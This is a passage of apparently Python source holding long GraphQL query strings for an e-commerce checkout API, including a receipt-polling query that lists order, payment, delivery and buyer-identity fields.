__typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name configurationParams __typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on FacebookPayWalletConfig{__typename name partnerId partnerMerchantId supportedContainers acquirerCountryCode mode paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on AmazonPayClassicWalletConfig{__typename name orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName additionalParameters{...on IdealBankSelectionParameterConfig{__typename label options{label value __typename}}__typename}orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}"""


QUERY_POLL = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId quantity componentCapabilities componentSource merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId componentCapabilities componentSource quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}components{...PurchaseOrderLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderLineComponent on PurchaseOrderLineComponent{stableId componentCapabilities 